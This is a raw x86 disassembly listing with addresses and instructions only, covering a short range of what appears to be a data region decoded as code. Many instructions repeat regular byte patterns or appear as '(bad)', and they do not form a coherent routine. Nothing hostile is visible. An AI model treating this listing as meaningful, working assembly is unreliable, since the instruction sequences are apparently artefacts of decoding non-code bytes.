  4132b1:	ss push edi
  4132b3:	imul   esi,DWORD PTR ss:[esi],0x70
  4132b7:	test   BYTE PTR ss:[esi],dh
  4132ba:	mov    dh,BYTE PTR [esi]
  4132bc:	call   0xaa36:0xa436a036
  4132c3:	ss mov dl,0x36
  4132c6:	mov    eax,0xc836bf36
  4132cb:	shl    DWORD PTR ss:[esi],1
  4132ce:	xlat   BYTE PTR ds:[ebx]
  4132cf:	ss loope 0x413308
  4132d2:	out    0x36,eax
  4132d4:	in     eax,dx
  4132d5:	div    DWORD PTR ss:[esi]
  4132d8:	add    al,0x37
  4132da:	or     dh,BYTE PTR [edi]
  4132dc:	adc    BYTE PTR [edi],dh
  4132de:	adc    eax,0x2a371b37
  4132e3:	aaa    
  4132e4:	das    
  4132e5:	aaa    
  4132e6:	cmp    dh,BYTE PTR [edi]
  4132e8:	inc    eax
  4132e9:	aaa    
  4132ea:	popa   
  4132eb:	aaa    
  4132ec:	outs   dx,BYTE PTR ds:[esi]
  4132ed:	aaa    
  4132ee:	xchg   ecx,eax
  4132ef:	aaa    
  4132f0:	mov    edi,0xe637ce37
  4132f5:	aaa    
  4132f6:	repnz aaa 
  4132f8:	or     DWORD PTR [eax],edi
  4132fa:	sbb    BYTE PTR [eax],bh
  4132fc:	sbb    eax,0x32382a38
  413301:	cmp    BYTE PTR [ecx],bh
  413303:	cmp    BYTE PTR [edx+0x38],al
  413306:	dec    eax
  413307:	cmp    BYTE PTR [edi+0x38],cl
  41330a:	push   0x6538b038
  41330f:	cmp    DWORD PTR [ebx+0x39],edi
  413312:	xchg   ebx,eax
  413313:	cmp    DWORD PTR [ebp+0xd39f039],edi
  413319:	cmp    dl,BYTE PTR [eax+0x3a]
  41331c:	xchg   esp,eax
  41331d:	cmp    ch,BYTE PTR [esi-0x2ec548c6]
  413323:	cmp    bl,bl
  413325:	cmp    ch,bl
  413327:	cmp    bl,BYTE PTR [ecx]
  413329:	cmp    esi,DWORD PTR [ecx]
  41332b:	cmp    esi,DWORD PTR [edi]
  41332d:	cmp    eax,DWORD PTR [esi+0x3b]
  413330:	pusha  
  413331:	cmp    eax,DWORD PTR [edx-0x5cc465c5]
  413337:	cmp    ebp,DWORD PTR [edi-0xcc425c5]
  41333d:	cmp    edi,eax
  41333f:	cmp    eax,DWORD PTR [eax]
  413341:	cmp    al,0x2e
  413343:	cmp    al,0x51
  413345:	cmp    al,0x78
  413347:	cmp    al,0x84
  413349:	cmp    al,0x9a
  41334b:	cmp    al,0xc3
  41334d:	cmp    al,0xd3
  41334f:	cmp    al,0xe2
  413351:	cmp    al,0xeb
  413353:	cmp    al,0xf9
  413355:	cmp    al,0xd
  413357:	cmp    eax,0x3d203d17
  41335c:	dec    edx
  41335d:	cmp    eax,0x3d863d5c
  413362:	sahf   
  413363:	cmp    eax,0x3ddc3dae
  413368:	sbb    eax,0x503e2a3e
  41336d:	ds push edi
  41336f:	ds jae 0x4133b0
  413372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413373:	ds mov bh,0x3e
  413376:	ret    0xcf3e
  413379:	ds loop 0x4133ba
  41337c:	idiv   BYTE PTR [esi]
  41337e:	cmp    eax,0x883f5b3f
  413383:	aas    
  413384:	pushf  
  413385:	aas    
  413386:	lds    edi,FWORD PTR [edi]
  413388:	sar    DWORD PTR [edi],1
  41338a:	in     eax,dx
  41338b:	aas    
  41338c:	add    BYTE PTR [eax+0x0],al
  41338f:	add    BYTE PTR [eax+0x1],ah
  413392:	add    BYTE PTR [eax],al
  413394:	adc    eax,0x41301b30
  413399:	xor    BYTE PTR [edi+0x30],dl
  41339c:	pop    ebp
  41339d:	xor    BYTE PTR [ebp+0x30],dh
  4133a0:	mov    edi,0x1030d730
  4133a5:	xor    DWORD PTR [esi],esi
  4133a7:	xor    DWORD PTR [esi+0x31],eax
  4133aa:	push   ebp
  4133ab:	xor    DWORD PTR [esi+0x31],ebp
  4133ae:	mov    ?,WORD PTR [ecx]
  4133b0:	cwde   
  4133b1:	xor    DWORD PTR [esi-0x44ce4ccf],esp
  4133b7:	xor    esp,ecx
  4133b9:	xor    esp,ebp
  4133bb:	xor    DWORD PTR [eax],ecx
  4133bd:	xor    dl,BYTE PTR [edx+esi*1]
  4133c0:	sbb    dh,BYTE PTR [edx]
  4133c2:	daa    
  4133c3:	xor    bh,BYTE PTR ds:0x50324632
  4133c9:	xor    bl,BYTE PTR [ecx+0x32]
  4133cc:	arpl   WORD PTR [edx],si
  4133ce:	outs   dx,DWORD PTR ds:[esi]
  4133cf:	xor    dh,BYTE PTR [ebp+0x32]
  4133d2:	jl     0x413406
  4133d4:	test   DWORD PTR [edx],esi
  4133d6:	mov    esi,DWORD PTR [edx]
  4133d8:	xchg   ebx,eax
  4133d9:	xor    bl,BYTE PTR [ecx-0x51cd59ce]
  4133df:	xor    dh,BYTE PTR [edx+esi*1+0x32d632d1]
  4133e6:	fdiv   QWORD PTR [edx]
  4133e8:	loope  0x41341c
  4133ea:	out    0x32,al
  4133ec:	jmp    0x413420
  4133ee:	lock xor dh,dh
  4133f1:	xor    bh,dh
  4133f3:	xor    cl,BYTE PTR [ebx]
  4133f5:	xor    esp,DWORD PTR [edx]
  4133f7:	xor    edi,DWORD PTR [edi]
  4133f9:	xor    edx,DWORD PTR [edi+0x33]
  4133fc:	outs   dx,BYTE PTR ds:[esi]
  4133fd:	xor    esi,DWORD PTR [esi+0x33]
  413400:	jg     0x413435
  413402:	test   BYTE PTR [ebx],dh
  413404:	mov    DWORD PTR [ebx],esi
  413406:	lahf   
  413407:	xor    esp,DWORD PTR [ebp-0x4ecc53cd]
  41340d:	xor    edi,DWORD PTR [esi-0x2acc32cd]
  413413:	xor    ebx,ebp
  413415:	xor    esi,ebx
  413417:	xor    edi,ebx
  413419:	xor    eax,DWORD PTR [edx]
  41341b:	xor    al,0x53
  41341d:	xor    al,0x5d
  41341f:	xor    al,0x63
  413421:	xor    al,0x6d
  413423:	xor    al,0xa5
  413425:	xor    al,0xab
  413427:	xor    al,0xb5
  413429:	xor    al,0xbb
  41342b:	xor    al,0xc4
  41342d:	xor    al,0xc9
  41342f:	xor    al,0xfb
  413431:	xor    al,0x1e
  413433:	xor    eax,0x35783562
  413438:	xchg   BYTE PTR ds:0x359f3597,dh
  41343e:	mov    ch,0x35
  413440:	mov    ebp,0xea35e135
  413445:	xor    eax,0x3662363a
  41344a:	test   eax,0xc736c136
  41344f:	ss (bad) 
  413451:	ss loop 0x41348a
  413454:	push   edi
  413455:	aaa    
  413456:	mov    WORD PTR [edi],?
  413458:	clc    
  413459:	aaa    
  41345a:	std    
  41345b:	aaa    
  41345c:	(bad)  
  41345f:	cmp    BYTE PTR [ecx+0x38],al
  413462:	inc    edi
  413463:	cmp    BYTE PTR [ecx],cl
  413465:	cmp    DWORD PTR [ecx+edi*1],esp
  413468:	xor    BYTE PTR [ecx],bh
  41346a:	aas    
  41346b:	cmp    DWORD PTR [eax+0x39],ecx
  41346e:	push   ecx
  41346f:	cmp    DWORD PTR [esi+0x39],esp
  413472:	jnp    0x4134ad
  413474:	mov    BYTE PTR [ecx],bh
  413476:	nop
  413477:	cmp    DWORD PTR [ecx+edi*1+0x39cd39c2],esi
  41347e:	jmp    0x633a:0x473a4239
  413485:	cmp    ch,BYTE PTR [edx+edi*1+0x77]
  413489:	cmp    bh,BYTE PTR [esi+0x3a]
  41348c:	xchg   ebp,eax
  41348d:	cmp    bl,BYTE PTR [ebx-0x58c55ec6]
  413493:	cmp    ch,BYTE PTR [ebp-0x45c54cc6]
  413499:	cmp    al,cl
  41349b:	cmp    cl,al
  41349d:	cmp    cl,bh
  41349f:	cmp    dl,dh
  4134a1:	cmp    bl,ch
  4134a3:	cmp    ah,ah
  4134a5:	cmp    ch,ah
  4134a7:	cmp    dh,ah
  4134a9:	cmp    bh,ah
  4134ab:	cmp    cl,BYTE PTR [eax]
  4134ad:	cmp    edx,DWORD PTR [ecx]
  4134af:	cmp    edx,DWORD PTR [esi]
  4134b1:	cmp    ebx,DWORD PTR [ebx+edi*1]
  4134b4:	cmp    esi,DWORD PTR es:[eax]
  4134b7:	cmp    eax,DWORD PTR [eax+0x3b]
  4134ba:	push   eax
  4134bb:	cmp    edx,DWORD PTR [esi+0x3b]
  4134be:	popa   
  4134bf:	cmp    esp,DWORD PTR [edi+0x3b]
  4134c2:	jae    0x4134ff
  4134c4:	cmp    DWORD PTR [ebx],0xffffff8c
  4134c7:	cmp    esp,DWORD PTR [eax-0x47c453c5]
  4134cd:	cmp    eax,ebp
  4134cf:	cmp    esp,edx
  4134d1:	cmp    esp,DWORD PTR [esp+edi*1]
  4134d4:	xor    BYTE PTR [esi+esi*4],bh
  4134d7:	cmp    al,0xd7
  4134d9:	cmp    al,0xe5
  4134db:	cmp    al,0x16
  4134dd:	cmp    eax,0x3d623d45
  4134e2:	scas   al,BYTE PTR es:[edi]
  4134e3:	cmp    eax,0x3e293dda
  4134e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134e9:	add    BYTE PTR ds:[eax],al
  4134ec:	add    BYTE PTR [eax+0x0],dl
  4134ef:	add    al,cl
  4134f1:	add    BYTE PTR [eax],al
  4134f3:	add    BYTE PTR [esi],ah
  4134f5:	xor    BYTE PTR [edx],bh
  4134f7:	xor    BYTE PTR [ebp+0x30],bl
  4134fa:	test   BYTE PTR [eax],dh
  4134fc:	cwde   
  4134fd:	xor    ah,bl
  4134ff:	xor    ebp,esp
  413501:	xor    DWORD PTR [ecx+0x32],ebx
  413504:	jns    0x413538
  413506:	daa    
  413507:	xor    ebx,DWORD PTR [eax+0x1833d433]
  41350d:	xor    al,0x41
  41350f:	xor    al,0x51
  413511:	xor    al,0x61
  413513:	xor    al,0x82
  413515:	xor    al,0x88
  413517:	xor    al,0xb3
  413519:	xor    al,0xb9
  41351b:	xor    al,0xe0
  41351d:	xor    al,0xec
  41351f:	xor    al,0x2
  413521:	xor    eax,0x3522350e
  413526:	cs xor eax,0x35b4357c
  41352c:	out    dx,eax
  41352d:	xor    eax,0x36203614
  413532:	sub    al,0x36
  413534:	pop    ecx
  413535:	mov    DWORD PTR ss:[esi],esi
  413538:	test   eax,0xd836d236
  41353d:	ss pop es
  41353f:	aaa    
  413540:	adc    DWORD PTR [edi],esi
  413542:	sbb    al,0x37
  413544:	and    esi,DWORD PTR [edi]
  413546:	ss aaa 
  413548:	inc    eax
  413549:	aaa    
  41354a:	popa   
  41354b:	aaa    
  41354c:	addr16 aaa 
  41354e:	xchg   edx,eax
  41354f:	aaa    
  413550:	xchg   esi,eax
  413551:	aaa    
  413552:	mov    ds:0xb237a637,al
  413557:	aaa    
  413558:	mov    dh,0x37
  41355a:	enter  0xe837,0x37
  41355e:	hlt    
  41355f:	aaa    
  413560:	adc    al,0x38
  413562:	sbb    al,0x38
  413564:	xor    al,0x38
  413566:	cmp    BYTE PTR [eax],bh
  413568:	inc    eax
  413569:	cmp    BYTE PTR [eax+edi*1+0x60],al
  41356d:	cmp    BYTE PTR [eax+edi*1-0x80],bh
  413571:	cmp    BYTE PTR [eax+edi*1+0x38b038a0],bl
  413578:	sar    BYTE PTR [eax],0xec
  41357b:	cmp    ah,dh
  41357d:	cmp    BYTE PTR [eax],bl
  41357f:	cmp    DWORD PTR [ecx+edi*1],ebp
  413582:	xor    al,0x39
  413584:	cmp    al,0x39
  413586:	inc    esp
  413587:	cmp    DWORD PTR [eax+0x39],ecx
  41358a:	push   eax
  41358b:	cmp    DWORD PTR [ecx+edi*1+0x6c],esp
  41358f:	cmp    DWORD PTR [eax-0x63c677c7],eax
  413595:	cmp    DWORD PTR [ecx+edi*1+0x39b439ac],esp
  41359c:	mov    eax,0xc439bc39
  4135a1:	cmp    eax,ebx
  4135a3:	cmp    eax,esp
  4135a5:	cmp    eax,ebp
  4135a7:	cmp    eax,esi
  4135a9:	cmp    esp,esi
  4135ab:	cmp    eax,edi
  4135ad:	cmp    DWORD PTR [eax],eax
  4135af:	cmp    dl,BYTE PTR [edx+edi*1]
  4135b2:	add    BYTE PTR [eax],al
  4135b4:	add    BYTE PTR [eax+0x0],ah
  4135b7:	add    BYTE PTR [eax],ah
  4135b9:	add    BYTE PTR [eax],al
  4135bb:	add    BYTE PTR [eax+esi*1],cl
  4135be:	adc    BYTE PTR [eax],dh
  4135c0:	adc    al,0x30
  4135c2:	sbb    al,0x30
  4135c4:	push   eax
  4135c5:	xor    BYTE PTR [eax+esi*1-0x7c],ch
  4135c9:	xor    BYTE PTR [eax+esi*1+0x30e430c4],ah
  4135d0:	adc    al,0x31
  4135d2:	cmp    al,0x31
  4135d4:	add    BYTE PTR [eax+0x0],dh
  4135d7:	add    BYTE PTR [eax+eax*1],cl
  4135da:	add    BYTE PTR [eax],al
  4135dc:	jl     0x41360f
	...
